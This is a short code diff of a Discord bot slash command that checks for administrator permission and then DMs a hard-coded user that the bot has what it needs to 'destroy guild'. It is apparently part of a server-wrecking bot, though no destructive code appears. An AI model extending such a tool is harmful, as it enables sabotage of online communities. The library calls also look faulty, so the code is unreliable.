@@ -35,14 +35,8 @@ class check(lightbulb.SlashCommand):
         if bot_has_guild_permissions(perm1=permissions.Permissions.ADMINISTRATOR) and ctx.author.id == 568138681148506126:
             await hikari.api.RESTClient.create_dm_channel(client,user)
             print('Has admin perms')
-            await user.send(content='Has all needed premisions can start an attack')
-            print('IT WORKED')
+            worked_embed = hikari.Embed(description='Has all needed prems to destroy guild', color=('#000000'))
+            await user.send(embed=worked_embed) 
             
-
-            
-
-            
-            
-        
 def load(bot: lightbulb.Bot) -> None:
     bot.add_slash_command(check)
